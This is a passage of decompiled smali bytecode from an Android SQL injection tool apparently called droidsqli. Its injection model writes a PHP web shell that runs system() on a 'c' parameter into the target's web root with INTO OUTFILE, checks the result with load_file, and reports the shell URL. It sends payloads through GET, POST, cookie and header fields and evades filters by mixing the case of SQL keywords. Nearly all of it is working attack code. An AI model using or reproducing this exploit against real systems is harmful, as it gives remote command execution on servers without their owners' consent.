    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 707
    iput-boolean v9, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->hasFileRight:Z

    .line 717
    .end local v1    # "hexResult":Ljava/lang/String;
    .end local v2    # "sourcePage":[Ljava/lang/String;
    :cond_3
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialQuery:Ljava/lang/String;

    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "1337"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v6, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->visibleIndex:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "7331"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "(select+0x"

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "<SQLi><?php system($_GET[\'c\']); ?><iLQS>"

    invoke-static {v7}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, ")"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    const-string v5, "--++"

    const-string v6, ""

    invoke-virtual {v4, v5, v6}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 718
    const-string v4, "+into+outfile+\""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "test_outfile.php\"--+"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    .line 717
    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 716
    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;)Ljava/lang/String;

    .line 721
    new-array v2, v9, [Ljava/lang/String;

    const-string v3, ""

    aput-object v3, v2, v8

    .line 722
    .restart local v2    # "sourcePage":[Ljava/lang/String;
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;

    invoke-direct {v3, p0, p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    const/4 v4, 0x5

    new-array v4, v4, [Ljava/lang/Object;

    .line 723
    new-instance v5, Ljava/lang/StringBuilder;

    const-string v6, "concat(hex(load_file(0x"

    invoke-direct {v5, v6}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-static {p1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v6, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "test_outfile.php"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v6}, Lnet/edgard/droidsqli/tool/StringTool;->strhex(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, ")),0x69)"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v8

    .line 724
    aput-object v2, v4, v9

    .line 725
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    aput-object v5, v4, v10

    .line 726
    invoke-static {v9}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    aput-object v5, v4, v12

    const/4 v5, 0x4

    .line 727
    const/4 v6, 0x0

    aput-object v6, v4, v5

    .line 722
    invoke-virtual {v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_loopIntoResults;->action([Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    .line 729
    .restart local v1    # "hexResult":Ljava/lang/String;
    const-string v3, ""

    invoke-virtual {v1, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    .line 730
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Can\'t read file "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "test_outfile.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    aget-object v4, v2, v8

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendResponseFromSite(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_0

    .line 734
    :cond_4
    const-string v3, ""

    invoke-virtual {p2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_5

    .line 735
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Webshell Url: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialUrl:Ljava/lang/String;

    iget-object v5, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialUrl:Ljava/lang/String;

    invoke-virtual {v5, v11}, Ljava/lang/String;->lastIndexOf(I)I

    move-result v5

    add-int/lit8 v5, v5, 0x1

    invoke-virtual {v4, v8, v5}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "test_outfile.php"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 736
    iget-object v3, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialUrl:Ljava/lang/String;

    iget-object v4, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialUrl:Ljava/lang/String;

    invoke-virtual {v4, v11}, Ljava/lang/String;->lastIndexOf(I)I

    move-result v4

    add-int/lit8 v4, v4, 0x1

    invoke-virtual {v3, v8, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object p2

    .line 739
    :cond_5
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    .line 740
    .local v0, "f":Ljava/util/ArrayList;, "Ljava/util/ArrayList<Ljava/lang/String;>;"
    invoke-virtual {p1, v11}, Ljava/lang/String;->lastIndexOf(I)I

    move-result v3

    invoke-virtual {p1}, Ljava/lang/String;->length()I

    move-result v4

    invoke-virtual {p1, v3, v4}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 741
    invoke-static {v1}, Lnet/edgard/droidsqli/tool/StringTool;->hexstr(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, "<SQLi><?php system($_GET[\'c\']); ?><iLQS>"

    invoke-virtual {v3, v4}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v3

    const/4 v4, -0x1

    if-le v3, v4, :cond_0

    .line 742
    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Webshell folder: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendMessage(Ljava/lang/String;)V

    .line 743
    new-instance v3, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v4, "add-shell"

    new-array v5, v10, [Ljava/lang/String;

    aput-object p1, v5, v8

    aput-object p2, v5, v9

    invoke-direct {v3, p0, v4, v5}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual {v3}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    goto/16 :goto_0
.end method

.method public inject(Ljava/lang/String;)Ljava/lang/String;
    .locals 2
    .param p1, "dataInjection"    # Ljava/lang/String;

    .prologue
    .line 1305
    const/4 v0, 0x0

    const/4 v1, 0x0

    invoke-virtual {p0, p1, v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->inject(Ljava/lang/String;[Ljava/lang/String;Z)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public inject(Ljava/lang/String;[Ljava/lang/String;Z)Ljava/lang/String;
    .locals 25
    .param p1, "dataInjection"    # Ljava/lang/String;
    .param p2, "responseHeader"    # [Ljava/lang/String;
    .param p3, "useVisibleIndex"    # Z

    .prologue
    .line 1314
    const/4 v5, 0x0

    .line 1315
    .local v5, "connection":Ljava/net/HttpURLConnection;
    const/16 v16, 0x0

    .line 1318
    .local v16, "urlObject":Ljava/net/URL;
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->initialUrl:Ljava/lang/String;

    move-object/from16 v18, v0

    .line 1319
    .local v18, "urlUltimate":Ljava/lang/String;
    const-string v19, "\\"

    const-string v20, "\\\\"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object p1

    .line 1322
    :try_start_0
    new-instance v17, Ljava/net/URL;

    invoke-direct/range {v17 .. v18}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/net/MalformedURLException; {:try_start_0 .. :try_end_0} :catch_0

    .end local v16    # "urlObject":Ljava/net/URL;
    .local v17, "urlObject":Ljava/net/URL;
    move-object/from16 v16, v17

    .line 1331
    .end local v17    # "urlObject":Ljava/net/URL;
    .restart local v16    # "urlObject":Ljava/net/URL;
    :goto_0
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    move-object/from16 v19, v0

    if-eqz v19, :cond_0

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    move-object/from16 v19, v0

    const-string v20, ""

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_0

    .line 1332
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static/range {v18 .. v18}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "GET"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->getData:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v18

    .line 1337
    :try_start_1
    move-object/from16 v0, p0

    iget v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->securitySteps:I

    move/from16 v19, v0

    packed-switch v19, :pswitch_data_0

    .line 1367
    :goto_1
    new-instance v17, Ljava/net/URL;

    invoke-direct/range {v17 .. v18}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/net/MalformedURLException; {:try_start_1 .. :try_end_1} :catch_1

    .end local v16    # "urlObject":Ljava/net/URL;
    .restart local v17    # "urlObject":Ljava/net/URL;
    move-object/from16 v16, v17

    .line 1375
    .end local v17    # "urlObject":Ljava/net/URL;
    .restart local v16    # "urlObject":Ljava/net/URL;
    :cond_0
    :goto_2
    :try_start_2
    invoke-virtual/range {v16 .. v16}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v19

    move-object/from16 v0, v19

    check-cast v0, Ljava/net/HttpURLConnection;

    move-object v5, v0

    .line 1376
    const/16 v19, 0x3a98

    move/from16 v0, v19

    invoke-virtual {v5, v0}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 1377
    const/16 v19, 0x3a98

    move/from16 v0, v19

    invoke-virtual {v5, v0}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 1383
    :goto_3
    const-string v12, "\n"

    .line 1389
    .local v12, "logs":Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    move-object/from16 v19, v0

    const-string v20, ""

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_1

    .line 1390
    const-string v19, "Cookie"

    const-string v20, "COOKIE"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v19

    move-object/from16 v1, v20

    invoke-virtual {v5, v0, v1}, Ljava/net/HttpURLConnection;->addRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 1391
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "Cookie: "

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "COOKIE"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->cookieData:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "\n"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 1398
    :cond_1
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    move-object/from16 v19, v0

    const-string v20, ""

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_2

    .line 1399
    const-string v19, "HEADER"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v19

    const-string v20, ";"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v20

    move-object/from16 v0, v20

    array-length v0, v0

    move/from16 v21, v0

    const/16 v19, 0x0

    :goto_4
    move/from16 v0, v19

    move/from16 v1, v21

    if-lt v0, v1, :cond_4

    .line 1406
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "Header: "

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "HEADER"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->headerData:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "\n"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 1413
    :cond_2
    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    move-object/from16 v19, v0

    const-string v20, ""

    invoke-virtual/range {v19 .. v20}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_3

    .line 1415
    const/16 v19, 0x1

    :try_start_3
    move/from16 v0, v19

    invoke-virtual {v5, v0}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V

    .line 1416
    const-string v19, "POST"

    move-object/from16 v0, v19

    invoke-virtual {v5, v0}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    .line 1417
    const-string v19, "Content-Type"

    const-string v20, "application/x-www-form-urlencoded"

    move-object/from16 v0, v19

    move-object/from16 v1, v20

    invoke-virtual {v5, v0, v1}, Ljava/net/HttpURLConnection;->addRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 1419
    new-instance v6, Ljava/io/DataOutputStream;

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v19

    move-object/from16 v0, v19

    invoke-direct {v6, v0}, Ljava/io/DataOutputStream;-><init>(Ljava/io/OutputStream;)V

    .line 1420
    .local v6, "dataOut":Ljava/io/DataOutputStream;
    const-string v19, "POST"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    move-object/from16 v20, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    invoke-virtual {v6, v0}, Ljava/io/DataOutputStream;->writeBytes(Ljava/lang/String;)V

    .line 1421
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->flush()V

    .line 1422
    invoke-virtual {v6}, Ljava/io/DataOutputStream;->close()V

    .line 1424
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "Post: "

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "POST"

    move-object/from16 v0, p0

    iget-object v0, v0, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->postData:Ljava/lang/String;

    move-object/from16 v21, v0

    move-object/from16 v0, p0

    move-object/from16 v1, v20

    move-object/from16 v2, v21

    move/from16 v3, p3

    move-object/from16 v4, p1

    invoke-direct {v0, v1, v2, v3, v4}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->buildQuery(Ljava/lang/String;Ljava/lang/String;ZLjava/lang/String;)Ljava/lang/String;

    move-result-object v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "\n"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    move-result-object v12

    .line 1433
    .end local v6    # "dataOut":Ljava/io/DataOutputStream;
    :cond_3
    :goto_5
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v19

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "\n"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    .line 1434
    const/4 v10, 0x0

    .line 1435
    .local v10, "i":I
    :goto_6
    invoke-virtual {v5, v10}, Ljava/net/HttpURLConnection;->getHeaderFieldKey(I)Ljava/lang/String;

    move-result-object v8

    .line 1436
    .local v8, "headerName":Ljava/lang/String;
    invoke-virtual {v5, v10}, Ljava/net/HttpURLConnection;->getHeaderField(I)Ljava/lang/String;

    move-result-object v9

    .line 1437
    .local v9, "headerValue":Ljava/lang/String;
    if-nez v8, :cond_5

    if-nez v9, :cond_5

    .line 1443
    new-instance v19, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;

    const-string v20, "add-header"

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    move-object/from16 v2, v20

    invoke-direct {v0, v1, v2, v12}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;Ljava/lang/Object;)V

    invoke-virtual/range {v19 .. v19}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$GUIThread;->run()V

    .line 1446
    const-string v13, ""

    .line 1448
    .local v13, "pageSource":Ljava/lang/String;
    :try_start_4
    new-instance v14, Ljava/io/BufferedReader;

    new-instance v19, Ljava/io/InputStreamReader;

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    move-object/from16 v0, v19

    invoke-direct {v14, v0}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 1449
    .local v14, "reader":Ljava/io/BufferedReader;
    :goto_7
    invoke-virtual {v14}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v11

    .local v11, "line":Ljava/lang/String;
    if-nez v11, :cond_7

    .line 1450
    invoke-virtual {v14}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/net/MalformedURLException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_6

    .line 1458
    .end local v11    # "line":Ljava/lang/String;
    .end local v14    # "reader":Ljava/io/BufferedReader;
    :goto_8
    return-object v13

    .line 1323
    .end local v8    # "headerName":Ljava/lang/String;
    .end local v9    # "headerValue":Ljava/lang/String;
    .end local v10    # "i":I
    .end local v12    # "logs":Ljava/lang/String;
    .end local v13    # "pageSource":Ljava/lang/String;
    :catch_0
    move-exception v7

    .line 1324
    .local v7, "e":Ljava/net/MalformedURLException;
    invoke-virtual {v7}, Ljava/net/MalformedURLException;->getMessage()Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, p0

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->sendErrorMessage(Ljava/lang/String;)V

    goto/16 :goto_0

    .line 1342
    .end local v7    # "e":Ljava/net/MalformedURLException;
    :pswitch_0
    :try_start_5
    const-string v19, "union\\+"

    const-string v20, "uNiOn+"

    invoke-virtual/range {v18 .. v20}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1343
    const-string v20, "select\\+"

    const-string v21, "sElEcT+"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1344
    const-string v20, "from\\+"

    const-string v21, "FrOm+"

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1345
    const-string v20, "from\\("

    const-string v21, "FrOm("

    invoke-virtual/range {v19 .. v21}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v19

    .line 1346
    const-string v20, "where\\+"

    const-string v21, "wHeRe+"

